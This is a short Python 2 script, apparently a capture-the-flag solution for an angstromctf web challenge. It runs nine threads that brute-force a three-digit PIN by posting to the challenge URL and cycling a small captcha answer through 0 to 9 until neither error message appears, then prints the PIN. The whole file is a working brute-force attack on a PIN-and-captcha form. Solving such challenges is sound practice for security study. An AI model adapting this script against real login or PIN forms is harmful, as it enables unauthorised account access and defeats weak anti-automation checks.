import requests
import time
import threading
import thread

def web1_bruteforce(start_Num):
	address='http://web.angstromctf.com:1342/'

	i = start_Num
	end_Num = start_Num + 100
	j = 0
	while True:
		payload = {'question1':j, 'pin':i}
		result = (requests.post(address,data=payload)).text
		flag_capcha = result.find('Bad captcha!')
		flag_pin = result.find('Wrong pin!')

		if flag_capcha == -1 & flag_pin == -1 :
			print ''
			print 'flag pin >>', i
			break

		elif flag_capcha != -1:
			#print 'Bad captcha!'
			#print 'Now pin number is', i, ',question1 >> ', j
			j = j+1
			if j==10:
				j=0

		elif flag_pin != -1:
			#print 'Wrong pin!'
			#print 'Now pin number is', i

			if i%10 == 0:
				print 'now pin number is', i
			i=i+1
			j=0

		if i >= end_Num:
			break

threads=[]
for i in range(1, 10):
	th = threading.Thread(target=web1_bruteforce, args=(i*100,))
	th.start()
	threads.append(th)

for th in threads:
	th.join()

print 'finish'